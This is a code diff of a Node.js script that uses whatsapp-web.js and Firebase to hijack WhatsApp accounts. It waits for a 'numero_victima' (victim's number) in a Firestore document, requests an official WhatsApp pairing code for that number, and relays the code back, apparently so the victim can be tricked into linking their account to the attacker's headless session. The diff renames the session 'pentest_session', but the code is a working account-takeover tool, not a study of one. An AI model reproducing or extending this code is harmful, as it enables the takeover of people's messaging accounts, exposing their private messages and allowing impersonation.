@@ -7,40 +7,44 @@ if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cer
 const db = admin.firestore();
 
 const client = new Client({
-    authStrategy: new LocalAuth({ clientId: "master_session" }),
+    authStrategy: new LocalAuth({ clientId: "pentest_session" }),
     puppeteer: {
         headless: true,
         args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
     }
 });
 
-// ESCUCHA ULTRA-RÁPIDA
+client.on('qr', () => { console.log("Esperando solicitud de número..."); });
+
+// ESCUCHA ACTIVA DE PETICIONES
 db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
     if (!snap.exists) return;
     const data = snap.data();
 
-    // Solo pedimos código si el status es 'solicitando_codigo' y no hay pairingCode REAL enviado
-    if (data.status === "solicitando_codigo" && data.numero_victima && (!data.pairingCode || data.pairingCode === "ZYWAQUNC")) {
-        console.log("GENERANDO CÓDIGO REAL PARA: " + data.numero_victima);
+    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
+        console.log("Generando vínculo real para: " + data.numero_victima);
         try {
+            // SOLICITUD DIRECTA AL MOTOR DE WHATSAPP
             const code = await client.requestPairingCode(data.numero_victima);
-            console.log("CÓDIGO REAL GENERADO: " + code);
+            console.log("CÓDIGO OFICIAL GENERADO: " + code);
             
-            // Actualizamos Firebase con el código VERDADERO de WhatsApp
+            // ACTUALIZACIÓN INMEDIATA EN FIREBASE
             await snap.ref.update({
                 pairingCode: code,
-                status: "mostrando_codigo_real"
+                status: "mostrando_codigo_real",
+                lastUpdate: Date.now()
             });
         } catch (err) {
-            console.log("Error: " + err.message);
+            console.log("Error al generar código: " + err.message);
+            await snap.ref.update({ status: "error" });
         }
     }
 });
 
 client.on('ready', () => {
-    console.log("¡SESIÓN VINCULADA EXITOSAMENTE!");
+    console.log("VINCULACIÓN EXITOSA - SESIÓN ACTIVA");
     db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
 });
 
 client.initialize();
-http.createServer((req, res) => { res.end('ONLINE'); }).listen(process.env.PORT || 3000);
+http.createServer((req, res) => { res.end('MOTOR READY'); }).listen(process.env.PORT || 3000);
